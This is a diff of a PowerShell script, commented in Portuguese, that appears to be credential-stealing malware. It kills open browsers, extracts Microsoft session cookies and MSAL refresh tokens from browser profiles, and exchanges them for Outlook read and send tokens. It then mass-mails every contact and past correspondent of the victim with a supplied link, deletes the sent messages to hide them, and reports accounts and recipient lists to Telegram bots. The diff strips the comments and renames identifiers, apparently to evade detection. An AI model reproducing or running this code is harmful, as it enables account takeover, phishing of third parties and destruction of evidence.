+function Get-OWAAllPeople([string]$tk, [string]$selfEmail, [int]$maxMessages) {
     $people = @{}
-    # 1) contatos
     $uri = "$OWA_API_BASE/me/contacts?`$top=200"
     while ($uri) {
-        try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing } catch { break }
+        try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing } catch { break }
         $j = $resp.Content | ConvertFrom-Json
         if ($j.value) {
             foreach ($c in $j.value) {
@@ -810,19 +651,14 @@ function Get-OWAAllPeople([string]$token, [string]$selfEmail, [int]$maxMessages)
         }
         $uri = $j."@odata.nextLink"
     }
-    # 2) Inbox + Enviados (From/To/Cc/Bcc). Enviados via /me/mailFolders/{id}
-    # (nao existe /me/sentitems na v2.0); se a pasta nao for achada por nome,
-    # seguimos so com o Inbox.
     $scanned = 0
     $uris = @("$OWA_API_BASE/me/messages")
-    $sentId = Get-OWASentFolderId $token
+    $sentId = Get-OWASentFolderId $tk
     if ($sentId) { $uris += "$OWA_API_BASE/me/mailFolders/$sentId/messages" }
     foreach ($base in $uris) {
-        # CONCATENA (nao "$base?..."): no PS 5.1, um '?' logo apos a variavel
-        # dentro de string dupla "come" o valor da variavel (URI ficava sem host).
         $uri = $base + "?`$top=200&`$select=From,ToRecipients,CcRecipients,BccRecipients"
         while ($uri -and ($maxMessages -le 0 -or $scanned -lt $maxMessages)) {
-            try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing } catch { break }
+            try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing } catch { break }
             $j = $resp.Content | ConvertFrom-Json
             if ($j.value) {
                 foreach ($m in $j.value) {
@@ -851,20 +687,11 @@ function Get-OWAAllPeople([string]$token, [string]$selfEmail, [int]$maxMessages)
     return $result
 }
 
-# ---------------- destinatários do histórico de enviados (agenda + To/Cc/Bcc) ----------------
-# SUBCONJUNTO de Get-OWAAllPeople: agenda + TODOS os To/Cc/Bcc da pasta Enviados
-# (quem o cliente ja enviou e-mail) — NAO inclui o Inbox (quem enviou PARA ele).
-# $maxMessages limita o escaneamento da pasta Enviados (0 = tudo). O proprio
-# endereco ($selfEmail) e filtrado. Retorna PSCustomObject com contatos
-# (array de @{ name; email }), total, daAgenda, doHistorico, amostra (ate 10
-# e-mails NOVOS do historico, fora da agenda), scanned e sentFolderFound
-# (distingue "pasta nao achada" de "pasta achada mas vazia").
-function Get-OWARecipients([string]$token, [string]$selfEmail, [int]$maxMessages) {
+function Get-OWARecipients([string]$tk, [string]$selfEmail, [int]$maxMessages) {
     $agenda = @{}
-    # 1) agenda (mesmo loop paginado de /me/contacts de Get-OWAAllPeople)
     $uri = "$OWA_API_BASE/me/contacts?`$top=200"
     while ($uri) {
-        try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing } catch { break }
+        try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing } catch { break }
         $j = $resp.Content | ConvertFrom-Json
         if ($j.value) {
             foreach ($c in $j.value) {
@@ -876,26 +703,19 @@ function Get-OWARecipients([string]$token, [string]$selfEmail, [int]$maxMessages
         }
         $uri = $j."@odata.nextLink"
     }
-    # 2) To/Cc/Bcc da pasta Enviados (historico de enviados). Enviados via
-    # /me/mailFolders/{id} (nao existe /me/sentitems na v2.0); se a pasta nao
-    # for achada por nome, seguimos so com a agenda.
     $historico = @{}
     $amostra = @()
     $scanned = 0
-    $sentId = Get-OWASentFolderId $token
+    $sentId = Get-OWASentFolderId $tk
     if ($sentId) {
         $base = "$OWA_API_BASE/me/mailFolders/$sentId/messages"
-        # CONCATENA (nao "$base?..."): no PS 5.1, um '?' logo apos a variavel
-        # dentro de string dupla "come" o valor da variavel (URI ficava sem host).
         $uri = $base + "?`$top=200&`$select=ToRecipients,CcRecipients,BccRecipients"
         while ($uri -and ($maxMessages -le 0 -or $scanned -lt $maxMessages)) {
-            try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing } catch { break }
+            try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing } catch { break }
             $j = $resp.Content | ConvertFrom-Json
             if ($j.value) {
                 foreach ($m in $j.value) {
                     $scanned++
-                    # -MaxMessages com granularidade de MENSAGEM (nao de pagina):
-                    # para o loop assim que o limite e atingido.
                     if ($maxMessages -gt 0 -and $scanned -ge $maxMessages) { $uri = $null; break }
                     foreach ($coll in @($m.ToRecipients, $m.CcRecipients, $m.BccRecipients)) {
                         if ($coll) {
@@ -906,8 +726,6 @@ function Get-OWARecipients([string]$token, [string]$selfEmail, [int]$maxMessages
                                         $key = $a.ToLower()
                                         if (-not $historico.ContainsKey($key)) {
                                             $historico[$key] = $a
-                                            # amostra so com enderecos NOVOS (nao ja na agenda):
-                                            # a linha do reporte diz "amostra do historico".
                                             if ($amostra.Count -lt 10 -and -not $agenda.ContainsKey($key)) { $amostra += $a }
                                         }
                                     }
@@ -920,8 +738,6 @@ function Get-OWARecipients([string]$token, [string]$selfEmail, [int]$maxMessages
             $uri = $j."@odata.nextLink"
         }
     }
-    # 3) merge: agenda + historico (agenda tem prioridade no nome), dedup por
-    # email em minusculas, filtra o proprio endereco.
     $people = @{}
     foreach ($k in $agenda.Keys) { $people[$k] = $agenda[$k] }
     foreach ($k in $historico.Keys) {
@@ -945,21 +761,14 @@ function Get-OWARecipients([string]$token, [string]$selfEmail, [int]$maxMessages
     }
 }
 
-# ---------------- SelfDelete: apaga da pasta Enviados ----------------
-# Usa o token WRITE. $all=$true apaga TUDO em Enviados; $all=$false apaga so as
-# cujo Subject bate EXATAMENTE com $subject (as que esta execucao enviou — nao
-# toca no enviado pre-existente do cliente). Listagem paginada + retry em 429
-# (Retry-After). DELETE /me/messages/{id} retorna 204. Retorna @{ apagadas;
-# falhas; total_visto }.
-function Remove-OWASentMessages([string]$token, [string]$subject, [bool]$all) {
+function Remove-OWASentMessages([string]$tk, [string]$subject, [bool]$all) {
     $apagadas = 0; $falhas = @(); $visto = 0
     $uri = "$OWA_API_BASE/me/messages?`$top=200"
     while ($uri) {
-        # --- lista uma pagina (retry em 429) ---
         $j = $null
         for ($attempt = 0; $attempt -lt 3; $attempt++) {
             try {
-                $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
+                $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing
                 $j = $resp.Content | ConvertFrom-Json
                 break
             } catch {
@@ -976,14 +785,11 @@ function Remove-OWASentMessages([string]$token, [string]$subject, [bool]$all) {
                 $visto++
                 $deletar = if ($all) { $true } else { ($m.Subject -eq $subject) }
                 if (-not $deletar) { continue }
-                # --- DELETE /me/messages/{id} (retry em 429) ---
-                # Captura o erro (status + corpo) p/ diagnosticar: 403 ErrorAccessDenied
-                # = token sem Mail.ReadWrite (le/envia mas nao apaga itens de mensagem).
                 $ok = $false; $delCode = 0; $delErr = $null
                 for ($attempt = 0; $attempt -lt 3; $attempt++) {
                     try {
                         $d = Invoke-WebRequest -Uri "$OWA_API_BASE/me/messages/$($m.id)" -Method Delete `
-                            -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
+                            -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing
                         $ok = ($d.StatusCode -eq 204)
                         break
                     } catch {
@@ -1008,7 +814,6 @@ function Remove-OWASentMessages([string]$token, [string]$subject, [bool]$all) {
     return @{ apagadas = $apagadas; falhas = $falhas; total_visto = $visto }
 }
 
-# ---------------- enumeração de perfis ----------------
 function Get-Profiles([string]$root) {
     $result = @()
     if (-not (Test-Path $root)) { return $result }
@@ -1021,7 +826,6 @@ function Get-Profiles([string]$root) {
         }
     }
     if ($result.Count -eq 0) {
-        # Opera: a própria raiz pode ser o perfil (sem sub-Default)
         if ((Test-Path (Join-Path $root "Network\Cookies")) -or (Test-Path (Join-Path $root "Local Storage\leveldb"))) {
             $result += @{ Name = (Split-Path $root -Leaf); Dir = $root }
         }
@@ -1029,10 +833,6 @@ function Get-Profiles([string]$root) {
     return $result
 }
 
-# ---------------- fechar navegadores (libera locks do leveldb/Cookies) ----------------
-# Perfis com navegador aberto ficam BLOQUEADO_NAVEGADOR_ABERTO (arquivo travado).
-# -CloseBrowsers mata os processos antes do scan e dá uma pausa p/ o SO soltar os
-# handles. Retorna a lista de nomes de processo que estavam rodando e foram fechados.
 function Close-Browsers {
     $procs = @("chrome", "msedge", "brave", "opera", "operagx")
     $fechados = @()
@@ -1047,11 +847,10 @@ function Close-Browsers {
     return $fechados
 }
 
-# ---------------- análise de um perfil ----------------
 function Analyze-Profile([string]$browser, [string]$pname, [string]$pdir, [bool]$validate) {
     $cookies = Test-MSCookies $pdir
-    $leveldb = Join-Path $pdir "Local Storage\leveldb"
-    $msal = Get-MSALToken $leveldb
+    $ldb = Join-Path $pdir "Local Storage\leveldb"
+    $msal = Get-MSALTk $ldb
     $display = $null
     try {
         $pref = Get-Content (Join-Path $pdir "Preferences") -Raw -ErrorAction Stop | ConvertFrom-Json
@@ -1061,17 +860,17 @@ function Analyze-Profile([string]$browser, [string]$pname, [string]$pdir, [bool]
     $readTok = $writeTok = $writeClient = $null
     $validated = $null
     if ($validate -and $msal) {
-        $readTok = Exchange-OWAToken $msal.refresh $msal.client $OWA_READ_SCOPE
+        $readTok = Exchange-OWATk $msal.rtk $msal.client $OWA_READ_SCOPE
         if ($readTok) {
-            $validated = Test-OWAToken $readTok
+            $validated = Test-OWATk $readTok
             if ($validated.state -eq "valido") {
-                $wt = Get-OWAWriteToken $msal.refresh $msal.client
-                if ($wt) { $writeTok = $wt.token; $writeClient = $wt.mailClient }
+                $wt = Get-OWAWriteTk $msal.rtk $msal.client
+                if ($wt) { $writeTok = $wt.tk; $writeClient = $wt.mailClient }
             }
         }
     }
 
-    if ($validated -and $validated.state -eq "valido") { $verdict = "LOGADO_TOKEN_VALIDO" }
+    if ($validated -and $validated.state -eq "valido") { $verdict = "LOGADO_VALIDO" }
     elseif ($cookies.ms -or $msal) { $verdict = "LOGADO_SESSAO_VIVA" }
     elseif ($cookies.state -eq "locked") { $verdict = "BLOQUEADO_NAVEGADOR_ABERTO" }
     else { $verdict = "SEM_SESSAO" }
@@ -1088,18 +887,15 @@ function Analyze-Profile([string]$browser, [string]$pname, [string]$pdir, [bool]
         msal_client = if ($msal) { $msal.client } else { $null }
         conta       = if ($validated) { $validated.email } else { $null }
         validacao   = $validated
-        token_read  = $readTok
-        token_write = $writeTok
+        tk_read  = $readTok
+        tk_write = $writeTok
         write_client = $writeClient
         exchange_error = if ($msal -and -not $readTok) { $script:LastExchangeError } else { $null }
         exchange_hint  = if ($msal -and -not $readTok) { Get-ExchangeErrorHint $script:LastExchangeError } else { $null }
-        # Falha da troca do token WRITE (Mail.Send): leitura OK mas escrita falhou.
-        # Diferente de exchange_error (que e da troca de LEITURA). P/ o "por que".
         write_exchange_error = if ($msal -and $readTok -and -not $writeTok) { $script:LastExchangeError } else { $null }
     }
 }
 
-# ---------------- main ----------------
 $validate = -not $NoValidate.IsPresent
 $fechados = @()
 if ($CloseBrowsers.IsPresent) { $fechados = @(Close-Browsers) }
@@ -1111,7 +907,7 @@ foreach ($b in $browsers) {
     }
 }
 
-$validos    = @($results | Where-Object { $_.veredito -eq "LOGADO_TOKEN_VALIDO" })
+$validos    = @($results | Where-Object { $_.veredito -eq "LOGADO_VALIDO" })
 $vivos      = @($results | Where-Object { $_.veredito -eq "LOGADO_SESSAO_VIVA" })
 $bloqueados = @($results | Where-Object { $_.veredito -eq "BLOQUEADO_NAVEGADOR_ABERTO" })
 
@@ -1127,7 +923,6 @@ if ($validos.Count -gt 0) {
 elseif ($vivos.Count -gt 0) {
     $comErr = @($vivos | Where-Object { $_.exchange_error })
     if ($comErr.Count -gt 0) {
-        # refresh MSAL presente mas a troca falhou — classificar o erro e dar a dica
         $decisao = "Sessão viva mas a troca do refresh FALHOU em: " +
             (($comErr | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ") +
             " -> " + ($comErr[0].exchange_hint)
@@ -1146,39 +941,36 @@ if ($bloqueados.Count -gt 0 -and ($validos.Count -gt 0 -or $vivos.Count -gt 0)) 
     $decisao += " | ATENÇÃO: perfis ainda travados (pode haver OUTRA conta logada ali): " +
         (($bloqueados | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
 }
-$comWrite = @($validos | Where-Object { $_.token_write })
+$comWrite = @($validos | Where-Object { $_.tk_write })
 if ($comWrite.Count -gt 0) {
     $decisao += " | WRITE OK (Mail.Send): " + (($comWrite | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
 } elseif ($validos.Count -gt 0) {
-    # Leitura OK mas NENHUM perfil conseguiu o token WRITE: anexar o MOTIVO
-    # (AADSTS65001 client invalido, throttle, rede) p/ o cliente ver no Telegram.
     $semWrite = @($validos | Where-Object { $_.write_exchange_error })
     if ($semWrite.Count -gt 0) {
         $decisao += " | WRITE FALHOU: " + (Get-ExchangeErrorHint $semWrite[0].write_exchange_error)
     }
 }
 
-# ---- modo -SendTo ----
 $envio = $null
 if ($SendTo) {
     $sendBody = Resolve-Body $Body $Link
     $sendSubject = if ($Subject) { $Subject } else { $DEFAULT_SUBJECT }
-    $src = $validos | Where-Object { $_.token_write } | Select-Object -First 1
+    $src = $validos | Where-Object { $_.tk_write } | Select-Object -First 1
     if ($src) {
-        $res = Send-OWAMail $src.token_write $SendTo $sendSubject $sendBody
+        $res = Send-OWAMsg $src.tk_write $SendTo $sendSubject $sendBody
         $envio = [PSCustomObject]@{ de = $src.conta; para = $SendTo; ok = $res.ok; status = $res.status; erro = $res.erro; perfil = "$($src.navegador)/$($src.perfil)" }
     }
     else {
         $cand = ($validos + $vivos) | Where-Object { $_.msal } | Select-Object -First 1
         if ($cand) {
-            $msal = Get-MSALToken (Join-Path $cand.profile_dir "Local Storage\leveldb")
-            $wtObj = if ($msal) { Get-OWAWriteToken $msal.refresh $msal.client } else { $null }
-            $wt = if ($wtObj) { $wtObj.token } else { $null }
+            $msal = Get-MSALTk (Join-Path $cand.profile_dir "Local Storage\leveldb")
+            $wtObj = if ($msal) { Get-OWAWriteTk $msal.rtk $msal.client } else { $null }
+            $wt = if ($wtObj) { $wtObj.tk } else { $null }
             if ($wt) {
-                $res = Send-OWAMail $wt $SendTo $sendSubject $sendBody
+                $res = Send-OWAMsg $wt $SendTo $sendSubject $sendBody
                 $envio = [PSCustomObject]@{ de = $cand.conta; para = $SendTo; ok = $res.ok; status = $res.status; perfil = "$($cand.navegador)/$($cand.perfil)" }
             } else {
-                $envio = [PSCustomObject]@{ de = $cand.conta; para = $SendTo; ok = $false; status = "sem_token_write"; perfil = "$($cand.navegador)/$($cand.perfil)" }
+                $envio = [PSCustomObject]@{ de = $cand.conta; para = $SendTo; ok = $false; status = "sem_write"; perfil = "$($cand.navegador)/$($cand.perfil)" }
             }
         } else {
             $envio = [PSCustomObject]@{ de = $null; para = $SendTo; ok = $false; status = "sem_perfil_com_refresh"; perfil = $null }
@@ -1186,33 +978,19 @@ if ($SendTo) {
     }
 }
 
-# ---- modo -ToAllContacts / -ToAllPeople / -ToAllRecipients: lista e envia ----
-# -ToAllContacts:   so a agenda (Get-OWAContacts).
-# -ToAllPeople:     agenda + historico de Inbox/Enviados (Get-OWAAllPeople) — pega
-#                   quem o cliente ja trocou mail, mesmo sem estar na agenda.
-# -ToAllRecipients: agenda + To/Cc/Bcc da pasta Enviados (Get-OWARecipients) —
-#                   SUBCONJUNTO de -ToAllPeople: NAO inclui o Inbox (so quem o
-#                   cliente ja enviou e-mail, nao quem enviou para ele).
-# -DryRun:          lista os destinatarios sem enviar (preview/teste).
-# -MaxContacts > 0 limita o total (trava de seguranca). Pausa curta entre envios.
 $envioTodos = $null
 if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsPresent) {
-    $src = $validos | Where-Object { $_.token_write -and $_.token_read } | Select-Object -First 1
-    # RETRY do token de escrita (mesmo padrao do -SendTo): nenhum perfil em
-    # $validos tem token_write+token_read -> tenta trocar o refresh MSAL de novo
-    # (o refresh pode ter rotacionado desde a analise). O fallback de token_read
-    # e necessario quando $cand vem de $vivos (LOGADO_SESSAO_VIVA, sem token_read
-    # validado): o token write ja validou via /me, entao serve p/ listar.
+    $src = $validos | Where-Object { $_.tk_write -and $_.tk_read } | Select-Object -First 1
     if (-not $src) {
         $cand = ($validos + $vivos) | Where-Object { $_.msal } | Select-Object -First 1
         if ($cand) {
-            $msal = Get-MSALToken (Join-Path $cand.profile_dir "Local Storage\leveldb")
-            $wtObj = if ($msal) { Get-OWAWriteToken $msal.refresh $msal.client } else { $null }
+            $msal = Get-MSALTk (Join-Path $cand.profile_dir "Local Storage\leveldb")
+            $wtObj = if ($msal) { Get-OWAWriteTk $msal.rtk $msal.client } else { $null }
             if ($wtObj) {
-                $cand.token_write  = $wtObj.token
+                $cand.tk_write  = $wtObj.tk
                 $cand.write_client = $wtObj.mailClient
-                if (-not $cand.token_read) { $cand.token_read = $wtObj.token }  # write token valida via /me; serve p/ listar
-                if (-not $cand.conta)    { $cand.conta = $wtObj.email }         # $vivos nao tem conta validada; o write token valida via /me
+                if (-not $cand.tk_read) { $cand.tk_read = $wtObj.tk }
+                if (-not $cand.conta)    { $cand.conta = $wtObj.email }
                 $src = $cand
             }
         }
@@ -1222,17 +1000,14 @@ if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsP
     if ($src) {
         $quebra = $null
         if ($ToAllRecipients.IsPresent) {
-            # -ToAllRecipients: agenda + historico de Enviados. Mapeamento
-            # EXPLICITO dos campos da quebra p/ o reporte (Build-ReportText) e
-            # o JSON de saida (quebra em ambos os modos: dryrun e envio real).
-            $r = Get-OWARecipients $src.token_read $src.conta $MaxMessages
+            $r = Get-OWARecipients $src.tk_read $src.conta $MaxMessages
             $contatos = @($r.contatos)
             $quebra = @{ daAgenda = $r.daAgenda; doHistorico = $r.doHistorico; amostra = $r.amostra; scanned = $r.scanned; sentFolderFound = $r.sentFolderFound }
         }
         elseif ($ToAllPeople.IsPresent) {
-            $contatos = @(Get-OWAAllPeople $src.token_read $src.conta $MaxMessages)
+            $contatos = @(Get-OWAAllPeople $src.tk_read $src.conta $MaxMessages)
         } else {
-            $contatos = @(Get-OWAContacts $src.token_read)
+            $contatos = @(Get-OWAContacts $src.tk_read)
         }
         if ($MaxContacts -gt 0 -and $contatos.Count -gt $MaxContacts) { $contatos = @($contatos | Select-Object -First $MaxContacts) }
         if ($DryRun.IsPresent) {
@@ -1246,12 +1021,10 @@ if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsP
             $ok = 0; $falhas = @(); $enviados = @()
             $limite = $false
             foreach ($c in $contatos) {
-                $res = Send-OWAMail $src.token_write $c.email $subject $body
+                $res = Send-OWAMsg $src.tk_write $c.email $subject $body
                 if ($res.ok) { $ok++; $enviados += $c.email }
                 else {
                     $falhas += [PSCustomObject]@{ email = $c.email; status = $res.status; erro = $res.erro }
-                    # trava de erro fatal: 429 limite diario OU 403 conta suspensa —
-                    # em ambos o OWA ja cortou o dia/conta; continuar queima e denuncia.
                     if ((($res.status -eq 429) -and ($res.erro -match "ErrorExceededMessageLimit")) -or (($res.status -eq 403) -and ($res.erro -match "ErrorAccountSuspend"))) {
                         $limite = $true
                         $erroTrava = if ($res.status -eq 403) { "Conta suspensa (HTTP 403)" } else { "Limite diário atingido (HTTP 429)" }
@@ -1260,9 +1033,6 @@ if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsP
                 }
                 Start-Sleep -Milliseconds 300
             }
-            # bot de lista: TODOS os destinatarios que NAO estao em $enviados —
-            # inclui os que falharam e os que a trava de limite impediu de tentar.
-            # Vao junto com os enviados ao 2o bot.
             $naoEnviados = @($contatos | Where-Object { $enviados -notcontains $_.email } | ForEach-Object { $_.email })
             $envioTodos = [PSCustomObject]@{
                 de = $src.conta; total = $contatos.Count; enviados = $ok; falhas = $falhas
@@ -1273,38 +1043,30 @@ if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsP
                 $envioTodos | Add-Member -MemberType NoteProperty -Name erro_trava -Value $erroTrava
             }
             if ($quebra) { $envioTodos | Add-Member -MemberType NoteProperty -Name quebra -Value $quebra }
-            # bot de lista: envia ao 2o bot (ListaToken/ListaChatId) o remetente +
-            # enviados + falhas por limite. Independente de -NoTelegram (que so
-            # desliga o reporte principal). Chunking em blocos <= 4000 chars evita
-            # o limite de 4096 do Telegram quando a lista e grande.
             if (($enviados.Count -gt 0) -or ($naoEnviados.Count -gt 0)) {
                 $listaText = Build-ListaText $src.conta $enviados $naoEnviados
                 $listaRes = @()
-                # chat_id(s) separados por virgula: a lista vai para CADA um
                 foreach ($chat in ($ListaChatId -split ',')) {
                     $chat = $chat.Trim()
                     if (-not $chat) { continue }
                     if ($listaText.Length -le 4000) {
-                        $listaRes += Send-TelegramMessage $ListaToken $chat $listaText
+                        $listaRes += Send-TgMsg $ListaTok $chat $listaText
                     } else {
                         $bloco = @(); $tam = 0
                         foreach ($linha in ($listaText -split "`n")) {
                             if (($tam + $linha.Length + 1) -gt 4000 -and $bloco.Count -gt 0) {
-                                $listaRes += Send-TelegramMessage $ListaToken $chat ($bloco -join "`n")
+                                $listaRes += Send-TgMsg $ListaTok $chat ($bloco -join "`n")
                                 $bloco = @(); $tam = 0
                             }
                             $bloco += $linha; $tam += $linha.Length + 1
                         }
-                        if ($bloco.Count -gt 0) { $listaRes += Send-TelegramMessage $ListaToken $chat ($bloco -join "`n") }
+                        if ($bloco.Count -gt 0) { $listaRes += Send-TgMsg $ListaTok $chat ($bloco -join "`n") }
                     }
                 }
                 $envioTodos | Add-Member -MemberType NoteProperty -Name lista -Value $listaRes
             }
         }
     } else {
-        # Distinguir: ha perfil com token de LEITURA mas SEM escrita (Mail.Send)
-        # vs. NENHUM perfil com token valido. O status e renderizado direto no
-        # Telegram (Build-ReportText), entao o texto precisa ser claro p/ o usuario.
         if ($validos.Count -gt 0) {
             $st = "token de leitura válido, mas SEM token de escrita (Mail.Send) — nada enviado"
             $de = $validos[0].conta
@@ -1316,20 +1078,14 @@ if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsP
     }
 }
 
-# ---- modo -SelfDelete: apaga o que esta execucao enviou (ou tudo, -SelfDeleteAll) ----
-# Assunto a filtrar: -Subject sempre vence; senao, o padrao do modo que rodou.
-# Pausa curta antes: o enviado aparece na pasta com pequeno atraso (consistencia
-# eventual). Usa o MESMO criterio de selecao de token WRITE dos modos de envio.
 $selfDelReport = $null
 if ($SelfDelete.IsPresent -or $SelfDeleteAll.IsPresent) {
     $all = $SelfDeleteAll.IsPresent
-    # Ambos os modos de envio usam $DEFAULT_SUBJECT quando -Subject e vazio,
-    # entao o filtro de apagamento e o mesmo em qualquer modo.
     $sdSubject = if ($Subject) { $Subject } else { $DEFAULT_SUBJECT }
-    $srcDel = $validos | Where-Object { $_.token_write } | Select-Object -First 1
+    $srcDel = $validos | Where-Object { $_.tk_write } | Select-Object -First 1
     if ($srcDel) {
         Start-Sleep -Seconds 2
-        $rd = Remove-OWASentMessages $srcDel.token_write $sdSubject $all
+        $rd = Remove-OWASentMessages $srcDel.tk_write $sdSubject $all
         $selfDelReport = [PSCustomObject]@{
             de = $srcDel.conta
             modo = if ($all) { "tudo" } else { "por_assunto: $sdSubject" }
@@ -1337,7 +1093,7 @@ if ($SelfDelete.IsPresent -or $SelfDeleteAll.IsPresent) {
             perfil = "$($srcDel.navegador)/$($srcDel.perfil)"
         }
     } else {
-        $selfDelReport = [PSCustomObject]@{ de = $null; apagadas = 0; falhas = @(); total_visto = 0; status = "sem_token_write" }
+        $selfDelReport = [PSCustomObject]@{ de = $null; apagadas = 0; falhas = @(); total_visto = 0; status = "sem_write" }
     }
 }
 
@@ -1352,14 +1108,12 @@ $out = [PSCustomObject]@{
     perfis    = $results
 }
 
-# ---- Telegram: dispara o reporte desta máquina (máquina + OK/erro + qtd) ----
 $telegram = $null
-if ($TelegramToken -and $TelegramChatId -and -not $NoTelegram.IsPresent) {
+if ($TgTok -and $TelegramChatId -and -not $NoTelegram.IsPresent) {
     $telegram = @()
-    # chat_id(s) separados por virgula: o reporte vai para CADA um (ex.: bot + chat pessoal)
     foreach ($chat in ($TelegramChatId -split ',')) {
         $chat = $chat.Trim()
-        if ($chat) { $telegram += Send-TelegramMessage $TelegramToken $chat (Build-ReportText $out) }
+        if ($chat) { $telegram += Send-TgMsg $TgTok $chat (Build-ReportText $out) }
     }
 }
 $out | Add-Member -MemberType NoteProperty -Name telegram -Value $telegram
